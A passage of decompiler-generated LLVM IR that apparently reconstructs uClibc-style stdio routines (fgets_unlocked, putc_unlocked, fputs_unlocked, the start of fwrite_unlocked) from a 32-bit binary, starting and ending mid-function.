  %v0_805d01c = load i32, i32* @global_var_807b688.681, align 8
  store i32 ptrtoint (i32* @global_var_8074d98.680 to i32), i32* @ecx, align 4
  %v1_805d023 = add i32 %v0_805d01c, 1
  store i32 %v1_805d023, i32* @global_var_807b688.681, align 8
  %v4_805d02c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v5_805d03f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  %v2_805d04b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  %v4_805d05b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805d0e22 = load i32, i32* @esi, align 4
  %v1_805d0e23 = icmp eq i32 %v0_805d0e22, 0
  %v1_805d0e410 = icmp eq i1 %v1_805d0e23, false
  br i1 %v1_805d0e410, label %dec_label_pc_805d065, label %dec_label_pc_805d0ea

dec_label_pc_805d065:                             ; preds = %dec_label_pc_805cff9, %dec_label_pc_805d0df
  %v0_805d073 = phi i32 [ %v3_805d0df, %dec_label_pc_805d0df ], [ %v0_805d0e22, %dec_label_pc_805cff9 ]
  %v1_805d065 = inttoptr i32 %v0_805d073 to i8*
  %v2_805d065 = load i8, i8* %v1_805d065, align 1
  %v3_805d065 = and i8 %v2_805d065, 64
  %v4_805d065 = icmp eq i8 %v3_805d065, 0
  br i1 %v4_805d065, label %dec_label_pc_805d0df, label %dec_label_pc_805d06a

dec_label_pc_805d06a:                             ; preds = %dec_label_pc_805d065
  %v0_805d06a = load i32, i32* @global_var_8074db0.665, align 16
  %v9_805d06a = icmp eq i32 %v0_805d06a, 2
  br i1 %v9_805d06a, label %dec_label_pc_805d092, label %dec_label_pc_805d073

dec_label_pc_805d073:                             ; preds = %dec_label_pc_805d06a
  %v1_805d073 = add i32 %v0_805d073, 56
  store i32 %v1_805d073, i32* @ebx, align 4
  %v5_805d082 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 %v1_805d073)
  %v0_805d087 = load i32, i32* @ebx, align 4
  %v2_805d08a = call i32 @pthread_mutex_lock(i32 %v0_805d087)
  %v0_805d092.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d092

dec_label_pc_805d092:                             ; preds = %dec_label_pc_805d06a, %dec_label_pc_805d073
  %v0_805d0a5 = phi i32 [ %v0_805d073, %dec_label_pc_805d06a ], [ %v0_805d092.pre, %dec_label_pc_805d073 ]
  %v1_805d092 = inttoptr i32 %v0_805d0a5 to i32*
  %v2_805d092 = load i32, i32* %v1_805d092, align 4
  %v1_805d094 = load i32, i32* @ebp, align 4
  %v2_805d094 = or i32 %v1_805d094, %v2_805d092
  %v1_805d096 = and i32 %v2_805d094, 832
  %v2_805d09b = icmp eq i32 %v1_805d096, 320
  %v1_805d0a0 = icmp eq i1 %v2_805d09b, false
  br i1 %v1_805d0a0, label %dec_label_pc_805d0c5, label %dec_label_pc_805d0a2

dec_label_pc_805d0a2:                             ; preds = %dec_label_pc_805d092
  %v2_805d0a6 = call i32 @__stdio_wcommit(i32 %v0_805d0a5)
  %v1_805d0ae = icmp eq i32 %v2_805d0a6, 0
  br i1 %v1_805d0ae, label %dec_label_pc_805d0b7, label %dec_label_pc_805d0b2

dec_label_pc_805d0b2:                             ; preds = %dec_label_pc_805d0a2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805d0c5

dec_label_pc_805d0b7:                             ; preds = %dec_label_pc_805d0a2
  %v0_805d0b7 = load i32, i32* @esi, align 4
  %v1_805d0b7 = add i32 %v0_805d0b7, 8
  %v2_805d0b7 = inttoptr i32 %v1_805d0b7 to i32*
  %v3_805d0b7 = load i32, i32* %v2_805d0b7, align 4
  %v2_805d0ba = add i32 %v0_805d0b7, 28
  %v3_805d0ba = inttoptr i32 %v2_805d0ba to i32*
  store i32 %v3_805d0b7, i32* %v3_805d0ba, align 4
  %v0_805d0bd = load i32, i32* @esi, align 4
  %v1_805d0bd = inttoptr i32 %v0_805d0bd to i32*
  %v2_805d0bd = load i32, i32* %v1_805d0bd, align 4
  %v2_805d0bd.tr = trunc i32 %v2_805d0bd to i16
  %v1_805d0c2 = and i16 %v2_805d0bd.tr, -65
  %v3_805d0c2 = inttoptr i32 %v0_805d0bd to i16*
  store i16 %v1_805d0c2, i16* %v3_805d0c2, align 2
  br label %dec_label_pc_805d0c5

dec_label_pc_805d0c5:                             ; preds = %dec_label_pc_805d092, %dec_label_pc_805d0b2, %dec_label_pc_805d0b7
  %v0_805d0c5 = load i32, i32* @global_var_8074db0.665, align 16
  %v9_805d0c5 = icmp eq i32 %v0_805d0c5, 2
  br i1 %v9_805d0c5, label %dec_label_pc_805d0df, label %dec_label_pc_805d0ce

dec_label_pc_805d0ce:                             ; preds = %dec_label_pc_805d0c5
  %v4_805d0d7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805d0df

dec_label_pc_805d0df:                             ; preds = %dec_label_pc_805d0c5, %dec_label_pc_805d065, %dec_label_pc_805d0ce
  %v0_805d0df = load i32, i32* @esi, align 4
  %v1_805d0df = add i32 %v0_805d0df, 32
  %v2_805d0df = inttoptr i32 %v1_805d0df to i32*
  %v3_805d0df = load i32, i32* %v2_805d0df, align 4
  store i32 %v3_805d0df, i32* @esi, align 4
  %v1_805d0e2 = icmp eq i32 %v3_805d0df, 0
  %v1_805d0e4 = icmp eq i1 %v1_805d0e2, false
  br i1 %v1_805d0e4, label %dec_label_pc_805d065, label %dec_label_pc_805d0ea

dec_label_pc_805d0ea:                             ; preds = %dec_label_pc_805d0df, %dec_label_pc_805cff9
  %v0_805d0ea = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_805d11b

dec_label_pc_805d0f1:                             ; preds = %dec_label_pc_805cfed
  store i32 0, i32* @edi, align 4
  %tmp26 = bitcast i16* %arg1 to i8*
  %v3_805d0f3 = load i8, i8* %tmp26, align 1
  %v4_805d0f3 = and i8 %v3_805d0f3, 64
  %v5_805d0f3 = icmp eq i8 %v4_805d0f3, 0
  br i1 %v5_805d0f3, label %dec_label_pc_805d11b, label %dec_label_pc_805d0f8

dec_label_pc_805d0f8:                             ; preds = %dec_label_pc_805d0f1
  store i32 -1, i32* @edi, align 4
  %v2_805d0ff = call i32 @__stdio_wcommit(i32 %v4_805cfe1)
  %v1_805d107 = icmp eq i32 %v2_805d0ff, 0
  %v1_805d109 = icmp eq i1 %v1_805d107, false
  br i1 %v1_805d109, label %dec_label_pc_805d11b, label %dec_label_pc_805d10b

dec_label_pc_805d10b:                             ; preds = %dec_label_pc_805d0f8
  %v2_805d10b = add i32 %v4_805cfe1, 8
  %v3_805d10b = inttoptr i32 %v2_805d10b to i32*
  %v4_805d10b = load i32, i32* %v3_805d10b, align 4
  store i32 0, i32* @edi, align 4
  %v3_805d110 = add i32 %v4_805cfe1, 28
  %v4_805d110 = inttoptr i32 %v3_805d110 to i32*
  store i32 %v4_805d10b, i32* %v4_805d110, align 4
  %tmp28 = bitcast i16* %arg1 to i32*
  %v3_805d113 = load i32, i32* %tmp28, align 4
  %v3_805d113.tr = trunc i32 %v3_805d113 to i16
  %v1_805d118 = and i16 %v3_805d113.tr, -65
  store i16 %v1_805d118, i16* %arg1, align 2
  br label %dec_label_pc_805d11b

dec_label_pc_805d11b:                             ; preds = %dec_label_pc_805d0f8, %dec_label_pc_805d0f1, %dec_label_pc_805d0ea, %dec_label_pc_805d10b
  %v0_805d11e = load i32, i32* @edi, align 4
  store i32 %v0_805cfdd, i32* @ebx, align 4
  store i32 %v0_805cfdc, i32* @esi, align 4
  store i32 %v0_805cfdb, i32* @edi, align 4
  store i32 %v0_805cfd8, i32* @ebp, align 4
  ret i32 %v0_805d11e

; uselistorder directives
  uselistorder i32 %v3_805d0df, { 1, 2, 0 }
  uselistorder i32 %v4_805cfe1, { 1, 2, 0, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8074d80.691 to i32), { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32* @global_var_807b688.681, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8074d98.680 to i32), { 0, 6, 1, 7, 2, 8, 9, 12, 3, 10, 5, 11, 4 }
  uselistorder i16* %arg1, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805d11b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805d0df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d0c5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805d092, { 1, 0 }
  uselistorder label %dec_label_pc_805d065, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_805d128 = load i32, i32* @ebp, align 4
  %v0_805d129 = load i32, i32* @edi, align 4
  %v4_805d133 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d133, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_805d133, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_805d179.preheader, label %dec_label_pc_805d185

dec_label_pc_805d179.preheader:                   ; preds = %entry
  %v1_805d17918 = add i32 %arg2, -1
  %v8_805d17919 = icmp eq i32 %v1_805d17918, 0
  store i32 %v1_805d17918, i32* @esi, align 4
  %v1_805d17a21 = icmp eq i1 %v8_805d17919, false
  br i1 %v1_805d17a21, label %dec_label_pc_805d143, label %dec_label_pc_805d17c

dec_label_pc_805d143:                             ; preds = %dec_label_pc_805d179.preheader, %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge.dec_label_pc_805d143_crit_edge
  %v0_805d143 = phi i32 [ %v0_805d143.pre, %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge.dec_label_pc_805d143_crit_edge ], [ %arg3, %dec_label_pc_805d179.preheader ]
  %v1_805d143 = add i32 %v0_805d143, 16
  %v2_805d143 = inttoptr i32 %v1_805d143 to i32*
  %v3_805d143 = load i32, i32* %v2_805d143, align 4
  store i32 %v3_805d143, i32* %eax.global-to-local, align 4
  %v2_805d146 = add i32 %v0_805d143, 24
  %v3_805d146 = inttoptr i32 %v2_805d146 to i32*
  %v4_805d146 = load i32, i32* %v3_805d146, align 4
  %v10_805d146 = icmp ult i32 %v3_805d143, %v4_805d146
  %v1_805d149 = icmp eq i1 %v10_805d146, false
  br i1 %v1_805d149, label %dec_label_pc_805d159, label %dec_label_pc_805d14b

dec_label_pc_805d14b:                             ; preds = %dec_label_pc_805d143
  %v1_805d14b = inttoptr i32 %v3_805d143 to i8*
  %v2_805d14b = load i8, i8* %v1_805d14b, align 1
  %v3_805d14b = zext i8 %v2_805d14b to i32
  %v4_805d14b = load i32, i32* @edx, align 4
  %v5_805d14b = and i32 %v4_805d14b, -256
  %v6_805d14b = or i32 %v5_805d14b, %v3_805d14b
  store i32 %v6_805d14b, i32* @edx, align 4
  %v1_805d14d = add i32 %v3_805d143, 1
  store i32 %v1_805d14d, i32* %eax.global-to-local, align 4
  %v2_805d14e = load i32, i32* @ebx, align 4
  %v3_805d14e = inttoptr i32 %v2_805d14e to i8*
  store i8 %v2_805d14b, i8* %v3_805d14e, align 1
  %v0_805d150 = load i32, i32* @ebx, align 4
  %v1_805d150 = add i32 %v0_805d150, 1
  store i32 %v1_805d150, i32* @ebx, align 4
  %v0_805d151 = load i32, i32* @edx, align 4
  %v1_805d151 = trunc i32 %v0_805d151 to i8
  %v10_805d151 = icmp eq i8 %v1_805d151, 10
  %v0_805d154 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d154 = load i32, i32* @ebp, align 4
  %v2_805d154 = add i32 %v1_805d154, 16
  %v3_805d154 = inttoptr i32 %v2_805d154 to i32*
  store i32 %v0_805d154, i32* %v3_805d154, align 4
  br i1 %v10_805d151, label %dec_label_pc_805d17c, label %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge

dec_label_pc_805d159:                             ; preds = %dec_label_pc_805d143
  %v0_805d15d = call i32 @getc_unlocked()
  %v1_805d15d = trunc i32 %v0_805d15d to i8
  store i32 %v0_805d15d, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_805d15d, 256
  %v11_805d165 = icmp eq i32 %sext.mask, 255
  %v1_805d168 = icmp eq i1 %v11_805d165, false
  br i1 %v1_805d168, label %dec_label_pc_805d177, label %dec_label_pc_805d16a

dec_label_pc_805d16a:                             ; preds = %dec_label_pc_805d159
  %v0_805d16a = load i32, i32* @ebp, align 4
  %v1_805d16a = inttoptr i32 %v0_805d16a to i8*
  %v2_805d16a = load i8, i8* %v1_805d16a, align 1
  %v3_805d16a = and i8 %v2_805d16a, 8
  %v4_805d16a = icmp eq i8 %v3_805d16a, 0
  br i1 %v4_805d16a, label %dec_label_pc_805d17c, label %dec_label_pc_805d185

dec_label_pc_805d177:                             ; preds = %dec_label_pc_805d159
  %v3_805d172 = load i32, i32* @ebx, align 4
  %v4_805d172 = inttoptr i32 %v3_805d172 to i8*
  store i8 %v1_805d15d, i8* %v4_805d172, align 1
  %v0_805d174 = load i32, i32* @ebx, align 4
  %v1_805d174 = add i32 %v0_805d174, 1
  store i32 %v1_805d174, i32* @ebx, align 4
  %v11_805d175 = icmp eq i8 %v1_805d15d, 10
  br i1 %v11_805d175, label %dec_label_pc_805d17c, label %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge

dec_label_pc_805d177.dec_label_pc_805d179_crit_edge: ; preds = %dec_label_pc_805d14b, %dec_label_pc_805d177
  %v0_805d179.pre = load i32, i32* @esi, align 4
  %v1_805d179 = add i32 %v0_805d179.pre, -1
  %v8_805d179 = icmp eq i32 %v1_805d179, 0
  store i32 %v1_805d179, i32* @esi, align 4
  %v1_805d17a = icmp eq i1 %v8_805d179, false
  br i1 %v1_805d17a, label %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge.dec_label_pc_805d143_crit_edge, label %dec_label_pc_805d17c

dec_label_pc_805d177.dec_label_pc_805d179_crit_edge.dec_label_pc_805d143_crit_edge: ; preds = %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge
  %v0_805d143.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805d143

dec_label_pc_805d17c:                             ; preds = %dec_label_pc_805d179.preheader, %dec_label_pc_805d14b, %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge, %dec_label_pc_805d177, %dec_label_pc_805d16a
  %v0_805d17c = load i32, i32* @ebx, align 4
  %v1_805d17c = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_805d17c, %v1_805d17c
  br i1 %tmp, label %dec_label_pc_805d180, label %dec_label_pc_805d185

dec_label_pc_805d180:                             ; preds = %dec_label_pc_805d17c
  %v1_805d180 = inttoptr i32 %v0_805d17c to i8*
  store i8 0, i8* %v1_805d180, align 1
  %v0_805d18a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d187

dec_label_pc_805d185:                             ; preds = %dec_label_pc_805d17c, %dec_label_pc_805d16a, %entry
  br label %dec_label_pc_805d187

dec_label_pc_805d187:                             ; preds = %dec_label_pc_805d180, %dec_label_pc_805d185
  %v0_805d18a = phi i32 [ %v0_805d18a.pre, %dec_label_pc_805d180 ], [ 0, %dec_label_pc_805d185 ]
  store i32 %v0_805d18a, i32* %eax.global-to-local, align 4
  store i32 %v0_805d129, i32* @edi, align 4
  store i32 %v0_805d128, i32* @ebp, align 4
  ret i32 %v0_805d18a

; uselistorder directives
  uselistorder i32 %v0_805d18a, { 1, 0 }
  uselistorder i32 %v0_805d17c, { 1, 0 }
  uselistorder i32 %v1_805d179, { 1, 0 }
  uselistorder i32 %v0_805d15d, { 0, 2, 1 }
  uselistorder i32 %v0_805d143, { 1, 0 }
  uselistorder label %dec_label_pc_805d187, { 1, 0 }
  uselistorder label %dec_label_pc_805d17c, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_805d177.dec_label_pc_805d179_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805d143, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_805d195 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805d19d = sext i8 %arg1 to i32
  store i32 %v4_805d19d, i32* @esi, align 4
  %v1_805d1a1 = add i32 %arg2, 16
  %v2_805d1a1 = inttoptr i32 %v1_805d1a1 to i32*
  %v3_805d1a1 = load i32, i32* %v2_805d1a1, align 4
  store i32 %v3_805d1a1, i32* %eax.global-to-local, align 4
  %v2_805d1a4 = add i32 %arg2, 28
  %v3_805d1a4 = inttoptr i32 %v2_805d1a4 to i32*
  %v4_805d1a4 = load i32, i32* %v3_805d1a4, align 4
  %v10_805d1a4 = icmp ult i32 %v3_805d1a1, %v4_805d1a4
  %v1_805d1a7 = icmp eq i1 %v10_805d1a4, false
  br i1 %v1_805d1a7, label %dec_label_pc_805d1b3, label %dec_label_pc_805d1a9

dec_label_pc_805d1a9:                             ; preds = %entry
  store i32 %v4_805d19d, i32* @edx, align 4
  %v3_805d1ab = inttoptr i32 %v3_805d1a1 to i8*
  store i8 %arg1, i8* %v3_805d1ab, align 1
  %v0_805d1ad = load i32, i32* %eax.global-to-local, align 4
  %v1_805d1ad = add i32 %v0_805d1ad, 1
  store i32 %v1_805d1ad, i32* %eax.global-to-local, align 4
  %v1_805d1ae = load i32, i32* @ebx, align 4
  %v2_805d1ae = add i32 %v1_805d1ae, 16
  %v3_805d1ae = inttoptr i32 %v2_805d1ae to i32*
  store i32 %v1_805d1ad, i32* %v3_805d1ae, align 4
  %v0_805d1de.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805d1de

dec_label_pc_805d1b3:                             ; preds = %entry
  %v1_805d1b3 = inttoptr i32 %arg2 to i16*
  %v2_805d1b3 = load i16, i16* %v1_805d1b3, align 2
  %v3_805d1b3 = zext i16 %v2_805d1b3 to i32
  %v1_805d1b6 = and i32 %v3_805d1b3, 192
  store i32 %v1_805d1b6, i32* %eax.global-to-local, align 4
  %v6_805d1bb = icmp eq i32 %v1_805d1b6, 192
  br i1 %v6_805d1bb, label %dec_label_pc_805d1d6, label %dec_label_pc_805d1c2

dec_label_pc_805d1c2:                             ; preds = %dec_label_pc_805d1b3
  %v0_805d1c2 = load i32, i32* @edx, align 4
  %v6_805d1ca = call i32 @__stdio_trans2w_o(i16* %v1_805d1b3, i32 128, i32 %v0_805d1c2, i32 %v0_805d1c2)
  store i32 %v6_805d1ca, i32* %eax.global-to-local, align 4
  %v1_805d1d2 = icmp eq i32 %v6_805d1ca, 0
  %v1_805d1d4 = icmp eq i1 %v1_805d1d2, false
  br i1 %v1_805d1d4, label %dec_label_pc_805d246, label %dec_label_pc_805d1c2.dec_label_pc_805d1d6_crit_edge

dec_label_pc_805d1c2.dec_label_pc_805d1d6_crit_edge: ; preds = %dec_label_pc_805d1c2
  %v0_805d1d6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d1d6

dec_label_pc_805d1d6:                             ; preds = %dec_label_pc_805d1c2.dec_label_pc_805d1d6_crit_edge, %dec_label_pc_805d1b3
  %v0_805d239 = phi i32 [ %v0_805d1d6.pre, %dec_label_pc_805d1c2.dec_label_pc_805d1d6_crit_edge ], [ %arg2, %dec_label_pc_805d1b3 ]
  %v1_805d1d6 = add i32 %v0_805d239, 4
  %v2_805d1d6 = inttoptr i32 %v1_805d1d6 to i32*
  %v3_805d1d6 = load i32, i32* %v2_805d1d6, align 4
  %v13_805d1d6 = icmp eq i32 %v3_805d1d6, -2
  %v1_805d1da = icmp eq i1 %v13_805d1d6, false
  br i1 %v1_805d1da, label %dec_label_pc_805d1e3, label %dec_label_pc_805d1dc

dec_label_pc_805d1dc:                             ; preds = %dec_label_pc_805d22b, %dec_label_pc_805d216, %dec_label_pc_805d211, %dec_label_pc_805d200, %dec_label_pc_805d1d6
  %v0_805d1dc = load i32, i32* @esi, align 4
  store i32 %v0_805d1dc, i32* @edx, align 4
  br label %dec_label_pc_805d1de

dec_label_pc_805d1de:                             ; preds = %dec_label_pc_805d1a9, %dec_label_pc_805d1dc
  %v0_805d1de = phi i32 [ %v0_805d1de.pre, %dec_label_pc_805d1a9 ], [ %v0_805d1dc, %dec_label_pc_805d1dc ]
  %v1_805d1de = urem i32 %v0_805d1de, 256
  br label %dec_label_pc_805d249

dec_label_pc_805d1e3:                             ; preds = %dec_label_pc_805d1d6
  %v1_805d1e3 = add i32 %v0_805d239, 12
  %v2_805d1e3 = inttoptr i32 %v1_805d1e3 to i32*
  %v3_805d1e3 = load i32, i32* %v2_805d1e3, align 4
  store i32 %v3_805d1e3, i32* %eax.global-to-local, align 4
  %v2_805d1e6 = add i32 %v0_805d239, 8
  %v3_805d1e6 = inttoptr i32 %v2_805d1e6 to i32*
  %v4_805d1e6 = load i32, i32* %v3_805d1e6, align 4
  %v15_805d1e6 = icmp eq i32 %v3_805d1e3, %v4_805d1e6
  br i1 %v15_805d1e6, label %dec_label_pc_805d22b, label %dec_label_pc_805d1eb

dec_label_pc_805d1eb:                             ; preds = %dec_label_pc_805d1e3
  %v2_805d1eb = add i32 %v0_805d239, 16
  %v3_805d1eb = inttoptr i32 %v2_805d1eb to i32*
  %v4_805d1eb = load i32, i32* %v3_805d1eb, align 4
  %v15_805d1eb = icmp eq i32 %v3_805d1e3, %v4_805d1eb
  %v1_805d1ee = icmp eq i1 %v15_805d1eb, false
  br i1 %v1_805d1ee, label %dec_label_pc_805d200, label %dec_label_pc_805d1f0

dec_label_pc_805d1f0:                             ; preds = %dec_label_pc_805d1eb
  %v2_805d1f4 = call i32 @__stdio_wcommit(i32 %v0_805d239)
  store i32 %v2_805d1f4, i32* %eax.global-to-local, align 4
  %v1_805d1fc = icmp eq i32 %v2_805d1f4, 0
  %v1_805d1fe = icmp eq i1 %v1_805d1fc, false
  br i1 %v1_805d1fe, label %dec_label_pc_805d246, label %dec_label_pc_805d1f0.dec_label_pc_805d200_crit_edge

dec_label_pc_805d1f0.dec_label_pc_805d200_crit_edge: ; preds = %dec_label_pc_805d1f0
  %v0_805d200.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d200

dec_label_pc_805d200:                             ; preds = %dec_label_pc_805d1f0.dec_label_pc_805d200_crit_edge, %dec_label_pc_805d1eb
  %v0_805d200 = phi i32 [ %v0_805d200.pre, %dec_label_pc_805d1f0.dec_label_pc_805d200_crit_edge ], [ %v0_805d239, %dec_label_pc_805d1eb ]
  %v1_805d200 = add i32 %v0_805d200, 16
  %v2_805d200 = inttoptr i32 %v1_805d200 to i32*
  %v3_805d200 = load i32, i32* %v2_805d200, align 4
  store i32 %v3_805d200, i32* %eax.global-to-local, align 4
  %v0_805d203 = load i32, i32* @esi, align 4
  store i32 %v0_805d203, i32* %edx.global-to-local, align 4
  %v1_805d205 = trunc i32 %v0_805d203 to i8
  %v3_805d205 = inttoptr i32 %v3_805d200 to i8*
  store i8 %v1_805d205, i8* %v3_805d205, align 1
  %v0_805d207 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d207 = add i32 %v0_805d207, 1
  store i32 %v1_805d207, i32* %eax.global-to-local, align 4
  %v0_805d208 = load i32, i32* @ebx, align 4
  %v1_805d208 = add i32 %v0_805d208, 1
  %v2_805d208 = inttoptr i32 %v1_805d208 to i8*
  %v3_805d208 = load i8, i8* %v2_805d208, align 1
  %v4_805d208 = urem i8 %v3_805d208, 2
  %v5_805d208 = icmp eq i8 %v4_805d208, 0
  %v2_805d20c = add i32 %v0_805d208, 16
  %v3_805d20c = inttoptr i32 %v2_805d20c to i32*
  store i32 %v1_805d207, i32* %v3_805d20c, align 4
  br i1 %v5_805d208, label %dec_label_pc_805d1dc, label %dec_label_pc_805d211

dec_label_pc_805d211:                             ; preds = %dec_label_pc_805d200
  %v0_805d211 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d211 = trunc i32 %v0_805d211 to i8
  %v10_805d211 = icmp eq i8 %v1_805d211, 10
  %v1_805d214 = icmp eq i1 %v10_805d211, false
  br i1 %v1_805d214, label %dec_label_pc_805d1dc, label %dec_label_pc_805d216

dec_label_pc_805d216:                             ; preds = %dec_label_pc_805d211
  %v0_805d219 = load i32, i32* @ebx, align 4
  %v2_805d21a = call i32 @__stdio_wcommit(i32 %v0_805d219)
  store i32 %v2_805d21a, i32* %eax.global-to-local, align 4
  %v1_805d222 = icmp eq i32 %v2_805d21a, 0
  br i1 %v1_805d222, label %dec_label_pc_805d1dc, label %dec_label_pc_805d226

dec_label_pc_805d226:                             ; preds = %dec_label_pc_805d216
  %v0_805d226 = load i32, i32* @ebx, align 4
  %v1_805d226 = add i32 %v0_805d226, 16
  %v2_805d226 = inttoptr i32 %v1_805d226 to i32*
  %v3_805d226 = load i32, i32* %v2_805d226, align 4
  %v4_805d226 = add i32 %v3_805d226, -1
  store i32 %v4_805d226, i32* %v2_805d226, align 4
  br label %dec_label_pc_805d246

dec_label_pc_805d22b:                             ; preds = %dec_label_pc_805d1e3
  %v0_805d22b = load i32, i32* @esi, align 4
  store i32 %v0_805d22b, i32* @ecx, align 4
  %v6_805d22d = trunc i32 %v0_805d22b to i8
  store i8 %v6_805d22d, i8* %stack_var_-9, align 1
  %v2_805d234 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_805d234, i32* %eax.global-to-local, align 4
  %v5_805d239 = inttoptr i32 %v0_805d239 to i16*
  %v6_805d23a = call i32 @__stdio_WRITE(i16* %v5_805d239, i32 %v2_805d234, i32 1, i32 %v3_805d1e3)
  store i32 %v6_805d23a, i32* %eax.global-to-local, align 4
  %v1_805d242 = icmp eq i32 %v6_805d23a, 0
  %v1_805d244 = icmp eq i1 %v1_805d242, false
  br i1 %v1_805d244, label %dec_label_pc_805d1dc, label %dec_label_pc_805d246

dec_label_pc_805d246:                             ; preds = %dec_label_pc_805d22b, %dec_label_pc_805d1f0, %dec_label_pc_805d1c2, %dec_label_pc_805d226
  br label %dec_label_pc_805d249

dec_label_pc_805d249:                             ; preds = %dec_label_pc_805d1de, %dec_label_pc_805d246
  %storemerge = phi i32 [ %v1_805d1de, %dec_label_pc_805d1de ], [ -1, %dec_label_pc_805d246 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805d195, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_805d1e3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805d239, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_805d249, { 1, 0 }
  uselistorder label %dec_label_pc_805d246, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_805d1de, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805d250 = load i32, i32* @esi, align 4
  %v0_805d251 = load i32, i32* @ebx, align 4
  store i32 %v0_805d251, i32* %stack_var_-8, align 4
  %v4_805d255 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d255, i32* @ebx, align 4
  %v3_805d25a = call i32 @strlen(i8* %arg1)
  store i32 %v3_805d25a, i32* @esi, align 4
  %v0_805d26b = load i32, i32* @ebx, align 4
  %v6_805d26c = call i32 @__GI_fwrite_unlocked(i32 %v0_805d26b, i64 1, i32 %v3_805d25a, i32 %arg2)
  store i32 %v6_805d26c, i32* @edx, align 4
  %v1_805d276 = load i32, i32* @esi, align 4
  %v12_805d276 = icmp eq i32 %v6_805d26c, %v1_805d276
  %v3_805d278 = select i1 %v12_805d276, i32 %v6_805d26c, i32 -1
  %v2_805d27e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d27e, i32* @ebx, align 4
  store i32 %v0_805d250, i32* @esi, align 4
  ret i32 %v3_805d278

; uselistorder directives
  uselistorder i32 %v6_805d26c, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805d39c = load i32, i32* @edi, align 4
  %v0_805d39d = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_805d3a3 = trunc i64 %arg2 to i32
  store i32 %v4_805d3a3, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805d3ab = inttoptr i32 %arg4 to i16*
  %v2_805d3ab = load i16, i16* %v1_805d3ab, align 2
  %v1_805d3ae = and i16 %v2_805d3ab, 192
  %v6_805d3b3 = icmp eq i16 %v1_805d3ae, 192
  br i1 %v6_805d3b3, label %dec_label_pc_805d3ce, label %dec_label_pc_805d3ba

dec_label_pc_805d3ba:                             ; preds = %entry
  %v0_805d3ba = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_805d3c2 = call i32 @__stdio_trans2w_o(i16* %v1_805d3ab, i32 128, i32 %v0_805d3ba, i32 %v0_805d3ba)
